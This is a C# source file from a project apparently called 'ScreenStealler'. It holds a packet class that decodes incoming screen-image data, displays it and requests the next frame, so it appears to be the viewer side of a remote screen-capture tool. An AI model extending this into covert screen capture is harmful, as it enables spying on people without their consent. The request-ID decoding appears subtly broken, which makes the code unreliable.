//## Author Information
//-**Author**: Feng-Hao Yeh
//-**Email**:
//  - Recommended: zzz3x2c1@gmail.com
//  - Alternate: yeh.feng.hao.110@gmail.com
//  - Work: yeh.feng.hao@try-n-go.com

using ScreenStealler_Client.Packet;
using ScreenStealler_Network.Network;

namespace ScreenStealler_Client.Packets
{
    internal class Packet_Display_Screen : Packet_Base<Packet_Types>
    {
        byte[] screen_data = new byte[0];
        private long Request_ID;
        public override void Decode(byte[] raw_data)
        {
            screen_data = new byte[raw_data.Length - 8];
            Request_ID = 0;
            int i;
            for (i = 0; i < 8; i++)
                Request_ID |= raw_data[i] << (i << 3);
            for (; i < raw_data.Length; i++)
                screen_data[i - 8] = raw_data[i];
        }

        public override byte[] Encode()
        {
            return new byte[0];
        }

        public override void Execute(Client<Packet_Types> client)
        {
            Global.Display_Screen(Request_ID, screen_data);
            Packet_Request_Screen packet = new Packet_Request_Screen();
            packet.Set_ID(Request_ID);
            client.Send_Message(packet);
        }

        public override Packet_Types Get_Type() => Packet_Types.Display_Screen;
    }
}
